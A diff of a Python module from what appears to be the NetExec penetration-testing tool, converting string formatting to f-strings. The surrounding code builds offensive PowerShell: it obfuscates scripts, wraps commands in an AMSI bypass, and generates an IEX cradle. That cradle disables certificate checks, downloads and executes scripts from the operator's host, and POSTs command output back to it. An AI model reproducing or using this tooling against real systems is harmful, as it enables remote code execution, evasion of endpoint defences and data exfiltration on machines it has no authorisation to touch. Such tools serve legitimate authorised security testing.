@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 import os
 import re
 from sys import exit
@@ -80,7 +79,7 @@ def obfs_ps_script(path_to_script):
     if is_powershell_installed() and obfuscate_ps_scripts:
         if os.path.exists(obfs_ps_script):
             nxc_logger.display("Using cached obfuscated Powershell script")
-            with open(obfs_ps_script, "r") as script:
+            with open(obfs_ps_script) as script:
                 return script.read()
 
         nxc_logger.display("Performing one-time script obfuscation, go look at some memes cause this can take a bit...")
@@ -93,11 +92,11 @@ def obfs_ps_script(path_to_script):
 
         nxc_logger.success("Script obfuscated successfully")
 
-        with open(obfs_ps_script, "r") as script:
+        with open(obfs_ps_script) as script:
             return script.read()
 
     else:
-        with open(get_ps_script(path_to_script), "r") as script:
+        with open(get_ps_script(path_to_script)) as script:
             """
             Strip block comments, line comments, empty lines, verbose statements,
             and debug statements from a PowerShell source file.
@@ -144,11 +143,11 @@ try{
     if force_ps32:
         command = (
             amsi_bypass
-            + """
+            + f"""
 $functions = {{
     function Command-ToExecute
     {{
-{command}
+{amsi_bypass + ps_command}
     }}
 }}
 if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')
@@ -161,7 +160,7 @@ else
     IEX "$functions"
     Command-ToExecute
 }}
-""".format(command=amsi_bypass + ps_command)
+"""
         )
 
     else:
@@ -280,7 +279,7 @@ if (($injected -eq $False) -or ($inject_once -eq $False)){{
     return ps_code
 
 
-def gen_ps_iex_cradle(context, scripts, command=str(), post_back=True):
+def gen_ps_iex_cradle(context, scripts, command="", post_back=True):
     """
     Generates a PowerShell IEX cradle script for executing one or more scripts.
 
@@ -313,19 +312,14 @@ IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/{ps_scri
         launcher = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n"
         launcher += "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'"
         for script in scripts:
-            launcher += "IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/{script}')\n".format(
-                server=context.server,
-                port=context.server_port,
-                addr=context.localip,
-                script=script,
-            )
+            launcher += f"IEX (New-Object Net.WebClient).DownloadString('{context.server}://{context.localip}:{context.server_port}/{script}')\n"
         launcher.strip()
         launcher += command if post_back is False else ""
 
     if post_back is True:
-        launcher += """
+        launcher += f"""
 $cmd = {command}
-$request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/')
+$request = [System.Net.WebRequest]::Create('{context.server}://{context.localip}:{context.server_port}/')
 $request.Method = 'POST'
 $request.ContentType = 'application/x-www-form-urlencoded'
 $bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd)
@@ -333,12 +327,7 @@ $request.ContentLength = $bytes.Length
 $requestStream = $request.GetRequestStream()
 $requestStream.Write($bytes, 0, $bytes.Length)
 $requestStream.Close()
-$request.GetResponse()""".format(
-            server=context.server,
-            port=context.server_port,
-            addr=context.localip,
-            command=command,
-        )
+$request.GetResponse()"""
 
     nxc_logger.debug(f"Generated PS IEX Launcher:\n {launcher}\n")
 
